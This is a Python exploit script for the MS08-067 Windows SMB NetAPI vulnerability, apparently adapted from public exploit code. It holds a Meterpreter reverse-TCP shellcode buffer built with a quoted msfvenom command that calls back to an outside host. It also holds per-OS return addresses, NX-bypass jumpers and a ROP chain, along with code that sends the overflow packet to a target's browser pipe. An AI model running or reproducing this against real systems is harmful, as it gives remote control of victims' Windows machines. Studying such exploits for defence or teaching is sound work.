#!/usr/bin/python

import struct
import time
import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)

print '#######################################################################'

print '#   MS08-067 Exploit'
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python

buf="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf += b"\x3f\x90\xd6\x42\xf9\x91\x49\x27\xfc\x41\x9f\x48\x98"
buf += b"\xf5\x98\x3f\xd6\x4b\x48\x3f\x49\x37\x9f\x98\x48\xf5"
buf += b"\xf9\xf8\xf8\x3f\xf8\x9f\x33\xc9\x83\xe9\xaf\xe8\xff"
buf += b"\xff\xff\xff\xc0\x5e\x81\x76\x0e\x80\x8e\xf9\xee\x83"
buf += b"\xee\xfc\xe2\xf4\x7c\x66\x7b\xee\x80\x8e\x99\x67\x65"
buf += b"\xbf\x39\x8a\x0b\xde\xc9\x65\xd2\x82\x72\xbc\x94\x05"
buf += b"\x8b\xc6\x8f\x39\xb3\xc8\xb1\x71\x55\xd2\xe1\xf2\xfb"
buf += b"\xc2\xa0\x4f\x36\xe3\x81\x49\x1b\x1c\xd2\xd9\x72\xbc"
buf += b"\x90\x05\xb3\xd2\x0b\xc2\xe8\x96\x63\xc6\xf8\x3f\xd1"
buf += b"\x05\xa0\xce\x81\x5d\x72\xa7\x98\x6d\xc3\xa7\x0b\xba"
buf += b"\x72\xef\x56\xbf\x06\x42\x41\x41\xf4\xef\x47\xb6\x19"
buf += b"\x9b\x76\x8d\x84\x16\xbb\xf3\xdd\x9b\x64\xd6\x72\xb6"
buf += b"\xa4\x8f\x2a\x88\x0b\x82\xb2\x65\xd8\x92\xf8\x3d\x0b"
buf += b"\x8a\x72\xef\x50\x07\xbd\xca\xa4\xd5\xa2\x8f\xd9\xd4"
buf += b"\xa8\x11\x60\xd1\xa6\xb4\x0b\x9c\x12\x63\xdd\xe6\xca"
buf += b"\xdc\x80\x8e\x91\x99\xf3\xbc\xa6\xba\xe8\xc2\x8e\xc8"
buf += b"\x87\x71\x2c\x56\x10\x8f\xf9\xee\xa9\x4a\xad\xbe\xe8"
buf += b"\xa7\x79\x85\x80\x71\x2c\xbe\xd0\xde\xa9\xae\xd0\xce"
buf += b"\xa9\x86\x6a\x81\x26\x0e\x7f\x5b\x6e\x84\x85\xe6\xf3"
buf += b"\xe5\x80\xf0\x91\xec\x80\x9f\xa2\x67\x66\xe4\xe9\xb8"
buf += b"\xd7\xe6\x60\x4b\xf4\xef\x06\x3b\x05\x4e\x8d\xe2\x7f"
buf += b"\xc0\xf1\x9b\x6c\xe6\x09\x5b\x22\xd8\x06\x3b\xe8\xed"
buf += b"\x94\x8a\x80\x07\x1a\xb9\xd7\xd9\xc8\x18\xea\x9c\xa0"
buf += b"\xb8\x62\x73\x9f\x29\xc4\xaa\xc5\xef\x81\x03\xbd\xca"
buf += b"\x90\x48\xf9\xaa\xd4\xde\xaf\xb8\xd6\xc8\xaf\xa0\xd6"
buf += b"\xd8\xaa\xb8\xe8\xf7\x35\xd1\x06\x71\x2c\x67\x60\xc0"
buf += b"\xaf\xa8\x7f\xbe\x91\xe6\x07\x93\x99\x11\x55\x35\x19"
buf += b"\xf3\xaa\x84\x91\x48\x15\x33\x64\x11\x55\xb2\xff\x92"
buf += b"\x8a\x0e\x02\x0e\xf5\x8b\x42\xa9\x93\xfc\x96\x84\x80"
buf += b"\xdd\x06\x3b"


nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))



        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + buf +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()
